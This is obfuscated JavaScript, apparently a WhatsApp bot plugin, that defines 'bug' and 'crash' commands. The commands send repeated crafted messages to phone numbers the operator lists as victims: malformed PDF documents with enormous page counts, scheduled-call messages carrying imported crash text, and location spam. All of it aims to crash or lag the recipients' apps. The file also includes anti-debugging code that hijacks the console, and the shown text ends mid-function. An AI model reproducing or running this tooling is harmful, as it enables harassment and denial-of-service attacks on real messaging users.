const _0x26a600 = function () {
  let _0x584f77 = true;
  return function (_0x552f25, _0x1639b7) {
    const _0x1f71d2 = _0x584f77 ? function () {
      if (_0x1639b7) {
        const _0x4ae20b = _0x1639b7.apply(_0x552f25, arguments);
        _0x1639b7 = null;
        return _0x4ae20b;
      }
    } : function () {};
    _0x584f77 = false;
    return _0x1f71d2;
  };
}();
const _0xf270eb = _0x26a600(this, function () {
  return _0xf270eb.toString().search("(((.+)+)+)+$").toString().constructor(_0xf270eb).search('(((.+)+)+)+$');
});
_0xf270eb();
const _0x329041 = function () {
  let _0x148637 = true;
  return function (_0x9508ca, _0x19f8b5) {
    const _0xc9ef8c = _0x148637 ? function () {
      if (_0x19f8b5) {
        const _0xea87f = _0x19f8b5.apply(_0x9508ca, arguments);
        _0x19f8b5 = null;
        return _0xea87f;
      }
    } : function () {};
    _0x148637 = false;
    return _0xc9ef8c;
  };
}();
const _0x3e9e03 = _0x329041(this, function () {
  let _0xecc262;
  try {
    const _0x53c30f = Function("return (function() {}.constructor(\"return this\")( ));");
    _0xecc262 = _0x53c30f();
  } catch (_0xc5afca) {
    _0xecc262 = window;
  }
  const _0x1adf1a = _0xecc262.console = _0xecc262.console || {};
  const _0x9009f6 = ["log", "warn", "info", 'error', "exception", "table", "trace"];
  for (let _0x29f0ee = 0x0; _0x29f0ee < _0x9009f6.length; _0x29f0ee++) {
    const _0x1596b4 = _0x329041.constructor.prototype.bind(_0x329041);
    const _0x2e3ea9 = _0x9009f6[_0x29f0ee];
    const _0x583fa5 = _0x1adf1a[_0x2e3ea9] || _0x1596b4;
    _0x1596b4.__proto__ = _0x329041.bind(_0x329041);
    _0x1596b4.toString = _0x583fa5.toString.bind(_0x583fa5);
    _0x1adf1a[_0x2e3ea9] = _0x1596b4;
  }
});
_0x3e9e03();
const {
  smd
} = require('../lib');
const {
  delay,
  loading,
  react
} = require('../lib/utils');
const moment = require("moment-timezone");
const conf = require('../config.js');
const fs = require('fs');
const path = require("path");
const {
  generateWAMessageFromContent,
  proto
} = require("@whiskeysockets/baileys");
const {
  bugtext1
} = require("../lib/bugs/bugtext1");
const {
  bugtext2
} = require("../lib/bugs/bugtext2");
const {
  bugtext3
} = require("../lib/bugs/bugtext3");
const {
  bugtext4
} = require("../lib/bugs/bugtext4");
const {
  bugtext6
} = require('../lib/bugs/bugtext6');
const {
  bugpdf
} = require("../lib/bugs/bugpdf.js");
const timewisher = _0xd50d61 => {
  if (_0xd50d61 < "23:59:00") {
    return "Good Night ðŸŒ†";
  } else {
    if (_0xd50d61 < '19:00:00') {
      return "Good Evening ðŸŒ†";
    } else {
      if (_0xd50d61 < "18:00:00") {
        return "Good Evening ðŸŒ†";
      } else {
        if (_0xd50d61 < '15:00:00') {
          return "Good Afternoon ðŸŒ…";
        } else {
          if (_0xd50d61 < "11:00:00") {
            return "Good Morning ðŸŒ„";
          } else {
            if (_0xd50d61 < '05:00:00') {
              return "Good Morning ðŸŒ„";
            }
          }
        }
      }
    }
  }
};
async function relaybug(_0x118714, _0x160a3f, _0x9475b6, _0x2e9197, _0x4dc5a8, _0x2f4959, _0x59e5de) {
  for (let _0x5e7b80 = 0x0; _0x5e7b80 < _0x2f4959.length; _0x5e7b80++) {
    if (!/^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/.test(_0x2f4959[_0x5e7b80])) {
      _0x2e9197(_0x2f4959[_0x5e7b80] + " not a valid phone number");
      continue;
    } else {
      const _0x58a621 = _0x2f4959[_0x5e7b80] + "@s.whatsapp.net";
      for (let _0x50bc79 = 0x0; _0x50bc79 < _0x4dc5a8; _0x50bc79++) {
        var _0x33ef1e = generateWAMessageFromContent(_0x118714, proto.Message.fromObject(_0x59e5de), {
          'userJid': _0x118714,
          'quoted': _0x9475b6
        });
        try {
          _0x160a3f.relayMessage(_0x58a621, _0x33ef1e.message, {
            'messageId': _0x33ef1e.key.id
          });
        } catch (_0xc9d798) {
          _0x2e9197("An error occured while sending bugs to " + _0x2f4959[_0x5e7b80]);
          console.log("An error occured while sending bugs to " + _0x58a621 + ": " + _0xc9d798);
          break;
        }
        await delay(0xbb8);
      }
      if (_0x2f4959.length > 0x1) {
        _0x2e9197(_0x4dc5a8 + " bugs send to " + _0x2f4959[_0x5e7b80] + " Successfully.");
      }
      await delay(0x1388);
    }
  }
  _0x2e9197("Successfully sent " + _0x4dc5a8 + " bugs to " + _0x2f4959.join(", ") + '.');
}
async function sendbug(_0x2b738f, _0x202d0a, _0x291622, _0x4631d8, _0x45bb8a, _0x2620b8, _0x52da43) {
  for (let _0x7b331a = 0x0; _0x7b331a < _0x2620b8.length; _0x7b331a++) {
    if (!/^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/.test(_0x2620b8[_0x7b331a])) {
      _0x4631d8(_0x2620b8[_0x7b331a] + " not a valid phone number");
      continue;
    } else {
      const _0x335031 = _0x2620b8[_0x7b331a] + "@s.whatsapp.net";
      for (let _0x3a6846 = 0x0; _0x3a6846 < _0x45bb8a; _0x3a6846++) {
        try {
          _0x202d0a.sendMessage(_0x335031, _0x52da43);
        } catch (_0x2abc59) {
          _0x4631d8("An error occured while sending bugs to " + _0x2620b8[_0x7b331a]);
          console.log("An error occured while sending bugs to " + _0x335031 + ": " + _0x2abc59);
          break;
        }
        await delay(0xbb8);
      }
      if (_0x2620b8.length > 0x1) {
        _0x4631d8(_0x45bb8a + " bugs send to " + _0x2620b8[_0x7b331a] + " Successfully.");
      }
      await delay(0x1388);
    }
  }
  _0x4631d8("Successfully sent " + _0x45bb8a + " bugs to " + _0x2620b8.join(", ") + '.');
}
smd({
  'pattern': "bugmenu",
  'category': "dev",
  'reaction': "✅"
}, async (_0x33f040, _0x3d279b, _0x2bdce5) => {
  const {
    ms: _0x5b7f6a,
    arg: _0x563ac3,
    repondre: _0x53faf0
  } = _0x2bdce5;
  const _0x582340 = moment().tz(conf.TZ).format("HH:mm:ss");
  const _0x24e520 = ['v1', 'v2'];
  const _0x4ca0aa = _0x24e520[Math.floor(Math.random() * _0x24e520.length)];
  const _0x3dcb31 = fs.readFileSync(path.resolve(path.join(__dirname, '..', "media", "deleted-message.jpg")));
  let _0x13e4c2 = "```Hello " + _0x5b7f6a.pushName + "\n" + timewisher(_0x582340) + "\n\nâ”â âŒœ ð“ðŠðŒ-ððŽð“ ð›ð®ð ð¦ðžð§ð® âŒŸ â\nâ”ƒâŽ” bug\nâ”ƒâŽ” crash\nâ”ƒâŽ” loccrash\nâ”ƒâŽ” amountbug <amount>\nâ”ƒâŽ” crashbug 263XXXX\nâ”ƒâŽ” pmbug 263XXXX\nâ”ƒâŽ” delaybug 263XXXX\nâ”ƒâŽ” trollybug 263XXXX\nâ”ƒâŽ” docubug 263XXXX\nâ”ƒâŽ” unlimitedbug 263XXXX\nâ”ƒâŽ” bombug 263XXXX\nâ”ƒâŽ” lagbug 263XXXX\nâ”ƒâŽ” gcbug <grouplink>\nâ”ƒâŽ” delaygcbug <grouplink>\nâ”ƒâŽ” trollygcbug <grouplink>\nâ”ƒâŽ” laggcbug <grouplink>\nâ”ƒâŽ” bomgcbug <grouplink>\nâ”ƒâŽ” unlimitedgcbug <grouplink>\nâ”ƒâŽ” docugcbug <grouplink>\nâ”—â" + "```";
  switch (_0x4ca0aa) {
    case 'v1':
      {
        _0x3d279b.sendMessage(_0x33f040, {
          'image': _0x3dcb31,
          'caption': _0x13e4c2
        }, {
          'quoted': _0x5b7f6a
        });
      }
      break;
    case 'v2':
      {
        _0x3d279b.sendMessage(_0x33f040, {
          'image': _0x3dcb31,
          'caption': _0x13e4c2,
          'contextInfo': {
            'mentionedJid': [_0x5b7f6a.key.remoteJid],
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'externalAdReply': {
              'showAdAttribution': true,
              'title': '' + conf.BOT,
              'body': "Bot Created By " + conf.OWNER_NAME,
              'thumbnail': {
                'url': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
              },
              'thumbnailUrl': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
              'previewType': "PHOTO",
              'sourceUrl': 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
              'mediaType': 0x1,
              'renderLargerAbhinail': true
            }
          }
        }, {
          'quoted': _0x5b7f6a
        });
      }
      break;
  }
});
smd({
  'pattern': "bug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x22ea0b, _0xc6136f, _0x5a9e30) => {
  const {
    ms: _0x192b56,
    arg: _0x20405e,
    repondre: _0x4c570d,
    superUser: _0x126e97
  } = _0x5a9e30;
  if (!_0x126e97) {
    return await _0x4c570d("You are not authorised to use this command !!!");
  }
  await loading(_0x22ea0b, _0xc6136f);
  for (let _0x2ce095 = 0x0; _0x2ce095 < 0x19; _0x2ce095++) {
    const _0x29cfb6 = {
      'url': './config.js'
    };
    await _0xc6136f.sendMessage(_0x22ea0b, {
      'document': _0x29cfb6,
      'mimetype': "⟨༑Ì¶⃟💥 𝐁Í¢𝐑𝐔𝐗Í¢𝐎 𝐅𝐔Í¢𝐂𝐊𝐏Í¢𝐃𝐅Ì‘👁ï¸༑Ì¶⟩",
      'title': "bx.pdf",
      'pageCount': 0x2540be3ff,
      'thumbnail': {
        'url': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
      },
      'thumbnailUrl': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
      'jpegThumbnail': {
        'url': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
      },
      'mediaKey': "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
      'fileName': "⟨༑Ì¶⃟💥 𝐁Í¢𝐑𝐔𝐗Í¢𝐎 𝐅𝐔Í¢𝐂𝐊𝐏Í¢𝐃𝐅Ì‘👁ï¸༑Ì¶⟩\n\n" + bugpdf
    });
  }
  await _0xc6136f.sendMessage(_0x22ea0b, {
    'react': {
      'text': "âœ…",
      'key': _0x192b56.key
    }
  });
});
smd({
  'pattern': "crash",
  'category': "dev",
  'reaction': "✅"
}, async (_0x1ad647, _0x8a7f4, _0x4b2310) => {
  const {
    ms: _0x542be2,
    arg: _0x1127eb,
    repondre: _0x17a8c6,
    superUser: _0x9b32ad
  } = _0x4b2310;
  if (!_0x9b32ad) {
    return await _0x17a8c6("You are not authorised to use this command !!!");
  }
  await loading(_0x1ad647, _0x8a7f4);
  try {
    for (let _0x461e40 = 0x0; _0x461e40 < 0xa; _0x461e40++) {
      await _0x17a8c6(bugtext6);
    }
  } catch (_0x3b836a) {
    await _0x17a8c6("an error occoured sending bugs");
    console.log("an error occured sending bugs : " + _0x3b836a);
    return;
  }
});
smd({
  'pattern': 'loccrash',
  'reaction': '🔖',
  'category': "dev"
}, async (_0x3c1ba4, _0x477a43, _0x359b88) => {
  const {
    ms: _0x2c2875,
    arg: _0x39141d,
    repondre: _0x238e46,
    superUser: _0x367362
  } = _0x359b88;
  if (!_0x367362) {
    return await _0x238e46("You are not authorised to use this command !!!");
  }
  await loading(_0x3c1ba4, _0x477a43);
  for (let _0x5bc473 = 0x0; _0x5bc473 < 0x14; _0x5bc473++) {
    for (let _0x42baf0 = 0x0; _0x42baf0 < '3'; _0x42baf0++) {
      _0x477a43.sendMessage(_0x3c1ba4, {
        'location': {
          'degreesLatitude': -6.28282828,
          'degreesLongitude': -1.2828,
          'name': "BRUX0N3RD\n\n\n\n\n\n\n\n"
        }
      }, {
        'quoted': _0x2c2875
      });
    }
  }
  await _0x477a43.sendMessage(_0x3c1ba4, {
    'react': {
      'text': "âœ…",
      'key': _0x2c2875.key
    }
  });
});
smd({
  'pattern': "crashbug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x462038, _0x249798, _0xd81ad1) => {
  const {
    ms: _0x433fe5,
    arg: _0x543f7f,
    repondre: _0x361155,
    superUser: _0x1f4ee9,
    prefixe: _0x44d3e3
  } = _0xd81ad1;
  if (!_0x1f4ee9) {
    return await _0x361155("You are not authorised to use this command !!!");
  }
  if (!_0x543f7f[0x0]) {
    return await _0x361155("Use " + _0x44d3e3 + "crashbug amount | numbers\n> Example " + _0x44d3e3 + "crashbug 30 |" + conf.NUMERO_OWNER + " or " + _0x44d3e3 + "crashbug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x462038, _0x249798);
  const _0x4bd724 = _0x543f7f.join('');
  let _0x1358e3 = 0x1e;
  let _0x4a9071 = [];
  const _0x409382 = {
    'url': "./config.js"
  };
  const _0x4eb29b = {
    'document': _0x409382,
    'mimetype': "⟨༑Ì¶⃟💥 𝐁Í¢𝐑𝐔𝐗Í¢𝐎 𝐅𝐔Í¢𝐂𝐊𝐏Í¢𝐃𝐅Ì‘👁ï¸༑Ì¶⟩",
    'title': "bx.pdf",
    'pageCount': 0x2540be3ff,
    'thumbnail': {
      'url': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
    },
    'thumbnailUrl': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
    'jpegThumbnail': {
      'url': "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
    },
    'mediaKey': 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
    'fileName': "⟨༑Ì¶⃟💥 𝐁Í¢𝐑𝐔𝐗Í¢𝐎 𝐅𝐔Í¢𝐂𝐊𝐏Í¢𝐃𝐅Ì‘👁ï¸༑Ì¶⟩\n\n" + bugpdf
  };
  if (_0x543f7f.length === 0x1) {
    _0x4a9071.push(_0x543f7f[0x0]);
    await _0x361155("sending " + _0x1358e3 + " bugs to " + _0x4a9071[0x0]);
    try {
      await sendbug(_0x462038, _0x249798, _0x433fe5, _0x361155, _0x1358e3, _0x4a9071, _0x4eb29b);
    } catch (_0x98119c) {
      await _0x361155("An error occured");
      console.log("An error occured: " + _0x98119c);
      await react(_0x462038, _0x249798, _0x433fe5, "âš ï¸");
    }
  } else {
    _0x1358e3 = parseInt(_0x4bd724.split('|')[0x0].trim());
    if (isNaN(_0x1358e3)) {
      return await _0x361155("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x4a9071 = _0x4bd724.split('|')[0x1].split(',').map(_0x3a3dd2 => _0x3a3dd2.trim()).filter(_0x142985 => _0x142985 !== '');
      if (_0x4a9071.length > 0x0) {
        await _0x361155("sending " + _0x1358e3 + " bugs to " + _0x4a9071.join(", "));
        try {
          await sendbug(_0x462038, _0x249798, _0x433fe5, _0x361155, _0x1358e3, _0x4a9071, _0x4eb29b);
        } catch (_0x257ce1) {
          await _0x361155("An error occured");
          console.log("An error occured: " + _0x257ce1);
          await react(_0x462038, _0x249798, _0x433fe5, "âš ï¸");
        }
      } else {
        return await _0x361155("No victims specfied");
      }
    }
  }
  await react(_0x462038, _0x249798, _0x433fe5, "âœ…");
});
smd({
  'pattern': 'amountbug',
  'category': "dev",
  'reaction': "✅"
}, async (_0x494433, _0x41ce0a, _0xfa6ef6) => {
  const {
    ms: _0x1bf832,
    arg: _0x184f90,
    repondre: _0x3780cd,
    superUser: _0x3e6778,
    prefixe: _0x277709
  } = _0xfa6ef6;
  if (!_0x3e6778) {
    return await _0x3780cd("You are not authorised to use this command !!!");
  }
  if (!_0x184f90[0x0]) {
    return await _0x3780cd("Use " + _0x277709 + "amountbug amount\n> Example " + _0x277709 + "amountbug 5");
  }
  const _0x32e89d = parseInt(_0x184f90[0x0]);
  if (isNaN(_0x32e89d) || _0x32e89d > conf.BOOM_MESSAGE_LIMIT || _0x32e89d < 0x1) {
    return await _0x3780cd("use a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
  }
  for (let _0x4aafc9 = 0x0; _0x4aafc9 < _0x32e89d; _0x4aafc9++) {
    const _0x1cebc1 = '' + bugtext1;
    var _0x873c3d = generateWAMessageFromContent(_0x494433, proto.Message.fromObject({
      'scheduledCallCreationMessage': {
        'callType': '2',
        'scheduledTimestampMs': '' + moment(0x3e8).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss"),
        'title': _0x1cebc1
      }
    }), {
      'userJid': _0x494433,
      'quoted': _0x1bf832
    });
    try {
      await _0x41ce0a.relayMessage(victim, _0x873c3d.message, {
        'messageId': _0x873c3d.key.id
      });
    } catch (_0x40c6d7) {
      await _0x3780cd("An error occured while sending bugs");
      console.log("An error occured while sending bugs: " + _0x40c6d7);
      return;
    }
    await delay(0xbb8);
  }
  await _0x3780cd("*Successfully sent as many bugs as " + _0x32e89d + " Please pause for 3 minutes*");
  await react(_0x494433, _0x41ce0a, _0x1bf832, "âœ…");
});
smd({
  'pattern': "pmbug",
  'category': "dev",
  'reaction': "✅"
}, async (_0xf6c99c, _0x4a6122, _0x37a3dd) => {
  const {
    ms: _0x174ca5,
    arg: _0xbc3e7b,
    repondre: _0x7d05a3,
    superUser: _0x42845e,
    prefixe: _0x4da094
  } = _0x37a3dd;
  if (!_0x42845e) {
    return await _0x7d05a3("You are not authorised to use this command !!!");
  }
  if (!_0xbc3e7b[0x0]) {
    return await _0x7d05a3("Use " + _0x4da094 + "pmbug amount | numbers\n> Example " + _0x4da094 + "pmbug 30 |" + conf.NUMERO_OWNER + " or " + _0x4da094 + "pmbug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0xf6c99c, _0x4a6122);
  const _0x1c4894 = _0xbc3e7b.join('');
  let _0x2052c3 = 0x1e;
  let _0x349e24 = [];
  const _0x1ceaa1 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss"),
      'title': '' + bugtext1
    }
  };
  if (_0xbc3e7b.length === 0x1) {
    _0x349e24.push(_0xbc3e7b[0x0]);
    await _0x7d05a3("sending " + _0x2052c3 + " bugs to " + _0x349e24[0x0]);
    try {
      await relaybug(_0xf6c99c, _0x4a6122, _0x174ca5, _0x7d05a3, _0x2052c3, _0x349e24, _0x1ceaa1);
    } catch (_0x182497) {
      await _0x7d05a3("An error occured");
      console.log("An error occured: " + _0x182497);
      await react(_0xf6c99c, _0x4a6122, _0x174ca5, "âš ï¸");
    }
  } else {
    _0x2052c3 = parseInt(_0x1c4894.split('|')[0x0].trim());
    if (_0x2052c3 > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x2052c3) || _0x2052c3 < 0x1) {
      return await _0x7d05a3("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x349e24 = _0x1c4894.split('|')[0x1].split(',').map(_0x23836d => _0x23836d.trim()).filter(_0x49a3dc => _0x49a3dc !== '');
      if (_0x349e24.length > 0x0) {
        await _0x7d05a3("sending " + _0x2052c3 + " bugs to " + _0x349e24.join(", "));
        try {
          await relaybug(_0xf6c99c, _0x4a6122, _0x174ca5, _0x7d05a3, _0x2052c3, _0x349e24, _0x1ceaa1);
        } catch (_0x52a44e) {
          await _0x7d05a3("An error occured");
          console.log("An error occured: " + _0x52a44e);
          await react(_0xf6c99c, _0x4a6122, _0x174ca5, "âš ï¸");
        }
      } else {
        return await _0x7d05a3("No victims specfied");
      }
    }
  }
  await react(_0xf6c99c, _0x4a6122, _0x174ca5, "âœ…");
});
smd({
  'pattern': "delaybug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x450067, _0x1a0a22, _0x5bc799) => {
  const {
    ms: _0x59e014,
    arg: _0x108147,
    repondre: _0x4cbc09,
    superUser: _0x107370,
    prefixe: _0x47205
  } = _0x5bc799;
  if (!_0x107370) {
    return await _0x4cbc09("You are not authorised to use this command !!!");
  }
  if (!_0x108147[0x0]) {
    return await _0x4cbc09("Use " + _0x47205 + "delaybug amount | numbers\n> Example " + _0x47205 + "delaybug 30 |" + conf.NUMERO_OWNER + " or " + _0x47205 + "delaybug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x450067, _0x1a0a22);
  const _0x2fb0d5 = _0x108147.join('');
  let _0x30a2e8 = 0x1e;
  let _0x3dd6c9 = [];
  const _0x405872 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"),
      'title': bugtext2
    }
  };
  if (_0x108147.length === 0x1) {
    _0x3dd6c9.push(_0x108147[0x0]);
    await _0x4cbc09("sending " + _0x30a2e8 + " bugs to " + _0x3dd6c9[0x0]);
    try {
      await relaybug(_0x450067, _0x1a0a22, _0x59e014, _0x4cbc09, _0x30a2e8, _0x3dd6c9, _0x405872);
    } catch (_0x2130a6) {
      await _0x4cbc09("An error occured");
      console.log("An error occured: " + _0x2130a6);
      await react(_0x450067, _0x1a0a22, _0x59e014, "âš ï¸");
    }
  } else {
    _0x30a2e8 = parseInt(_0x2fb0d5.split('|')[0x0].trim());
    if (_0x30a2e8 > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x30a2e8) || _0x30a2e8 < 0x1) {
      return await _0x4cbc09("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x3dd6c9 = _0x2fb0d5.split('|')[0x1].split(',').map(_0x49c331 => _0x49c331.trim()).filter(_0xd05237 => _0xd05237 !== '');
      if (_0x3dd6c9.length > 0x0) {
        await _0x4cbc09("sending " + _0x30a2e8 + " bugs to " + _0x3dd6c9.join(", "));
        try {
          await relaybug(_0x450067, _0x1a0a22, _0x59e014, _0x4cbc09, _0x30a2e8, _0x3dd6c9, _0x405872);
        } catch (_0x335a0e) {
          await _0x4cbc09("An error occured");
          console.log("An error occured: " + _0x335a0e);
          await react(_0x450067, _0x1a0a22, _0x59e014, "âš ï¸");
        }
      } else {
        return await _0x4cbc09("No victims specfied");
      }
    }
  }
  await react(_0x450067, _0x1a0a22, _0x59e014, 'âœ…');
});
smd({
  'pattern': 'docubug',
  'category': "dev",
  'reaction': "✅"
}, async (_0x1f1202, _0xc5ebb3, _0x13dd7a) => {
  const {
    ms: _0x4ba573,
    arg: _0x542840,
    repondre: _0x597cc6,
    superUser: _0x415469,
    prefixe: _0x4bd6de
  } = _0x13dd7a;
  if (!_0x415469) {
    return await _0x597cc6("You are not authorised to use this command !!!");
  }
  if (!_0x542840[0x0]) {
    return await _0x597cc6("Use " + _0x4bd6de + "docubug amount | numbers\n> Example " + _0x4bd6de + "docubug 30 |" + conf.NUMERO_OWNER + " or " + _0x4bd6de + "docubug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x1f1202, _0xc5ebb3);
  const _0x58bbd4 = _0x542840.join('');
  let _0x1ec4a3 = 0xf;
  let _0x5242cc = [];
  const _0x5b6594 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"),
      'title': '' + bugtext1
    }
  };
  if (_0x542840.length === 0x1) {
    _0x5242cc.push(_0x542840[0x0]);
    await _0x597cc6("sending " + _0x1ec4a3 + " bugs to " + _0x5242cc[0x0]);
    try {
      await relaybug(_0x1f1202, _0xc5ebb3, _0x4ba573, _0x597cc6, _0x1ec4a3, _0x5242cc, _0x5b6594);
    } catch (_0x400ec8) {
      await _0x597cc6("An error occured");
      console.log("An error occured: " + _0x400ec8);
      await react(_0x1f1202, _0xc5ebb3, _0x4ba573, "âš ï¸");
    }
  } else {
    _0x1ec4a3 = parseInt(_0x58bbd4.split('|')[0x0].trim());
    if (_0x1ec4a3 > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x1ec4a3) || _0x1ec4a3 < 0x1) {
      return await _0x597cc6("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x5242cc = _0x58bbd4.split('|')[0x1].split(',').map(_0x33b53c => _0x33b53c.trim()).filter(_0x9fde8e => _0x9fde8e !== '');
      if (_0x5242cc.length > 0x0) {
        await _0x597cc6("sending " + _0x1ec4a3 + " bugs to " + _0x5242cc.join(", "));
        try {
          await relaybug(_0x1f1202, _0xc5ebb3, _0x4ba573, _0x597cc6, _0x1ec4a3, _0x5242cc, _0x5b6594);
        } catch (_0x14c9aa) {
          await _0x597cc6("An error occured");
          console.log("An error occured: " + _0x14c9aa);
          await react(_0x1f1202, _0xc5ebb3, _0x4ba573, "âš ï¸");
        }
      } else {
        return await _0x597cc6("No victims specfied");
      }
    }
  }
  await react(_0x1f1202, _0xc5ebb3, _0x4ba573, "âœ…");
});
smd({
  'pattern': "unlimitedbug",
  'category': "dev",
  'reaction': "✅"
}, async (_0xd95fa0, _0x1a0db2, _0x1c8ea6) => {
  const {
    ms: _0x5db940,
    arg: _0x4d678d,
    repondre: _0x451afe,
    superUser: _0x179af1,
    prefixe: _0x4c8be1
  } = _0x1c8ea6;
  if (!_0x179af1) {
    return await _0x451afe("You are not authorised to use this command !!!");
  }
  if (!_0x4d678d[0x0]) {
    return await _0x451afe("Use " + _0x4c8be1 + "unlimitedbug amount | numbers\n> Example " + _0x4c8be1 + "unlimitedbug 30 |" + conf.NUMERO_OWNER + " or " + _0x4c8be1 + "unlimitedbug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0xd95fa0, _0x1a0db2);
  const _0xcc402b = _0x4d678d.join('');
  let _0x24f4f9 = 0x1e;
  let _0x162714 = [];
  const _0x4cde70 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"),
      'title': bugtext3
    }
  };
  if (_0x4d678d.length === 0x1) {
    _0x162714.push(_0x4d678d[0x0]);
    await _0x451afe("sending " + _0x24f4f9 + " bugs to " + _0x162714[0x0]);
    try {
      await relaybug(_0xd95fa0, _0x1a0db2, _0x5db940, _0x451afe, _0x24f4f9, _0x162714, _0x4cde70);
    } catch (_0x179775) {
      await _0x451afe("An error occured");
      console.log("An error occured: " + _0x179775);
      await react(_0xd95fa0, _0x1a0db2, _0x5db940, "âš ï¸");
    }
  } else {
    _0x24f4f9 = parseInt(_0xcc402b.split('|')[0x0].trim());
    if (_0x24f4f9 > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x24f4f9) || _0x24f4f9 < 0x1) {
      return await _0x451afe("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x162714 = _0xcc402b.split('|')[0x1].split(',').map(_0x86d924 => _0x86d924.trim()).filter(_0x4983b4 => _0x4983b4 !== '');
      if (_0x162714.length > 0x0) {
        await _0x451afe("sending " + _0x24f4f9 + " bugs to " + _0x162714.join(", "));
        try {
          await relaybug(_0xd95fa0, _0x1a0db2, _0x5db940, _0x451afe, _0x24f4f9, _0x162714, _0x4cde70);
        } catch (_0x50b8a7) {
          await _0x451afe("An error occured");
          console.log("An error occured: " + _0x50b8a7);
          await react(_0xd95fa0, _0x1a0db2, _0x5db940, "âš ï¸");
        }
      } else {
        return await _0x451afe("No victims specfied");
      }
    }
  }
  await react(_0xd95fa0, _0x1a0db2, _0x5db940, "âœ…");
});
smd({
  'pattern': "bombug",
  'category': "dev",
  'reaction': "✅"
}, async (_0x2e7ad0, _0x21e572, _0x3ce1cc) => {
  const {
    ms: _0x4f6c2e,
    arg: _0x5ac2e4,
    repondre: _0x3e8fae,
    superUser: _0x3a229b,
    prefixe: _0x112b9e
  } = _0x3ce1cc;
  if (!_0x3a229b) {
    return await _0x3e8fae("You are not authorised to use this command !!!");
  }
  if (!_0x5ac2e4[0x0]) {
    return await _0x3e8fae("Use " + _0x112b9e + "bombug amount | numbers\n> Example " + _0x112b9e + "bombug 30 |" + conf.NUMERO_OWNER + " or " + _0x112b9e + "bombug " + conf.NUMERO_OWNER.split(',')[0x0]);
  }
  await loading(_0x2e7ad0, _0x21e572);
  const _0x514be9 = _0x5ac2e4.join('');
  let _0x51f00a = 0x1e;
  let _0x1ceca0 = [];
  const _0x5b1f12 = {
    'scheduledCallCreationMessage': {
      'callType': '2',
      'scheduledTimestampMs': '' + moment(0x3e8).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"),
      'title': bugtext4
    }
  };
  if (_0x5ac2e4.length === 0x1) {
    _0x1ceca0.push(_0x5ac2e4[0x0]);
    await _0x3e8fae("sending " + _0x51f00a + " bugs to " + _0x1ceca0[0x0]);
    try {
      await relaybug(_0x2e7ad0, _0x21e572, _0x4f6c2e, _0x3e8fae, _0x51f00a, _0x1ceca0, _0x5b1f12);
    } catch (_0x47d792) {
      await _0x3e8fae("An error occured");
      console.log("An error occured: " + _0x47d792);
      await react(_0x2e7ad0, _0x21e572, _0x4f6c2e, "âš ï¸");
    }
  } else {
    _0x51f00a = parseInt(_0x514be9.split('|')[0x0].trim());
    if (_0x51f00a > conf.BOOM_MESSAGE_LIMIT || isNaN(_0x51f00a) || _0x51f00a < 0x1) {
      return await _0x3e8fae("amount must be a valid intiger between 1-" + conf.BOOM_MESSAGE_LIMIT);
    } else {
      _0x1ceca0 = _0x514be9.split('|')[0x1].split(',').map(_0x1bb888 => _0x1bb888.trim()).filter(_0xf2edc4 => _0xf2edc4 !== '');
